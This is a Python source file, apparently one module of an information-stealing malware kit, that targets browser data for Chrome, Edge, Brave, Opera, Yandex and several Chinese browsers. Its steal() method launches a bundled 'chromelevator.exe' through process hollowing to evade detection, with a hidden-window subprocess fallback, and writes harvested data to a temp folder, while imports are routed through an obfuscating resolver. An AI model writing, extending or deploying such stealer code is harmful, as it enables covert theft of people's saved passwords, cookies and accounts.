from core.resolver import (
    Resolver, _OS, _TIME, _SUBPROCESS, _SHUTIL, _DATETIME, _TYPING, _TEMPFILE
)
os = Resolver.get_mod(_OS)
time = Resolver.get_mod(_TIME)
subprocess = Resolver.get_mod(_SUBPROCESS)
shutil = Resolver.get_mod(_SHUTIL)
datetime = Resolver.get_mod(_DATETIME).datetime
temp_mod = Resolver.get_mod(_TEMPFILE) # Added temp_mod here
Any, Dict, List, Optional = (
    Resolver.get_mod(_TYPING).Any, 
    Resolver.get_mod(_TYPING).Dict, 
    Resolver.get_mod(_TYPING).List, 
    Resolver.get_mod(_TYPING).Optional
)
from core.base import BaseModule

class BrowserModule(BaseModule):
    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        local = os.environ.get('LOCALAPPDATA', '')
        roaming = os.environ.get('APPDATA', '')
        
        self.chromium_browsers = {
            'chrome': {'name': 'Google Chrome', 'path': os.path.join(local, "Google\\\\Chrome\\\\User Data")},
            'edge': {'name': 'Microsoft Edge', 'path': os.path.join(local, "Microsoft\\\\Edge\\\\User Data")},
            'brave': {'name': 'Brave', 'path': os.path.join(local, "BraveSoftware\\\\Brave-Browser\\\\User Data")},
            'opera': {'name': 'Opera', 'path': os.path.join(roaming, "Opera Software\\\\Opera Stable")},
            'opera_gx': {'name': 'Opera GX', 'path': os.path.join(roaming, "Opera Software\\\\Opera GX Stable")},
            'vivaldi': {'name': 'Vivaldi', 'path': os.path.join(local, "Vivaldi\\\\User Data")},
            'yandex': {'name': 'Yandex', 'path': os.path.join(local, "Yandex\\\\YandexBrowser\\\\User Data")},
            'cent': {'name': 'Cent Browser', 'path': os.path.join(local, "CentBrowser\\\\User Data")},
            'chromium': {'name': 'Chromium', 'path': os.path.join(local, "Chromium\\\\User Data")},
            # Chinese Localized Browsers
            '360safe': {'name': '360 Safe Browser', 'path': os.path.join(local, '360chrome\\Chrome\\User Data')},
            '360ee': {'name': '360 Extreme Browser', 'path': os.path.join(local, '360Chrome\\Chrome\\User Data')},
            'qq': {'name': 'QQ Browser', 'path': os.path.join(local, 'Tencent\\QQBrowser\\User Data')},
            'uc': {'name': 'UC Browser', 'path': os.path.join(local, 'UCBrowser\\User Data_V7')},
            'baidu': {'name': 'Baidu Browser', 'path': os.path.join(local, 'Baidu\\BaiduBrowser\\User Data')},
            '2345': {'name': '2345 Browser', 'path': os.path.join(local, '2345Explorer\\User Data')}
        }

    def run(self) -> bool:
        """A-04: Implementation of standardized run method."""
        try:
            self.log("Starting browser data extraction...")
            return self.steal()
        except Exception as e:
            self.log(f"Extraction failed: {e}")
            return False

    def steal(self) -> bool:
        """Steals browser data using chromelevator.exe via Native Hollowing (Professional)"""
        try:
            injector = ChromeInjector()
            if not injector.is_available():
                self.log("chromelevator.exe not found. Aborting.")
                return False

            self.log(f"Hollowing {os.path.basename(injector.injector_path)} into system process...")
            if self.stealth_inject_binary(injector.injector_path):
                self.log("Injection successful. Harvesting started.")
                return True

            # Fallback to standard execution if hollowing fails
            self.log("Stealthy hollowing failed, falling back to standard execution...")
            return injector.run_injector(action="all", timeout=120)
        except Exception as e:
            self.log(f"Extraction error: {e}")
            return False

    def stealth_inject_binary(self, binary_path: str) -> bool:
        """Launches a binary using native Process Hollowing (Stealthy)"""
        try:
            import clr
            Resolver.load_native()
            from VanguardCore import SafetyManager, Resolver
            
            with open(binary_path, "rb") as f:
                payload = f.read()
            
            # Binary payload must be passed as System.Byte[]
            from System import Array, Byte
            net_payload = Array.CreateInstance(Byte, len(payload))
            for i, b in enumerate(payload):
                net_payload[i] = b
                
            temp_mod = Resolver.get_mod("tempfile")
            output_dir = os.path.join(temp_mod.gettempdir(), "VOutput")
            os.makedirs(output_dir, exist_ok=True)
            
            # Arguments for chromelevator
            args = f"all --method nt -o \"{output_dir}\""
            
            return SafetyManager.ProcessManager.StartStealthy(net_payload, args)
        except Exception as e:
            self.log(f"Injection fatal error: {e}")
            return False

class ChromeInjector:
    def __init__(self):
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        possible_names = [
            os.path.join(base_dir, "core", "chromelevator.exe"),
            os.path.join(base_dir, "bin", "chromelevator.exe"),
            os.path.join(base_dir, "chromelevator.exe"),
        ]
        self.injector_path = next((n for n in possible_names if os.path.exists(n)), None)

    def is_available(self):
        return self.injector_path is not None

    def run_injector(self, action="all", timeout=60):
        if not self.is_available(): return False
        try:
            subprocess = Resolver.get_mod(_SUBPROCESS)
            temp_mod = Resolver.get_mod(_TEMPFILE)
            output_dir = os.path.join(temp_mod.gettempdir(), "VOutput")
            os.makedirs(output_dir, exist_ok=True)
            
            cmd = [self.injector_path, action, "--method", "nt", "-o", output_dir]
            # Use subprocess.DEVNULL to avoid pipe hang, and no capture
            subprocess.run(cmd, timeout=timeout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
            return True
        except Exception as e:
            print(f"Error: {e}")
            return False
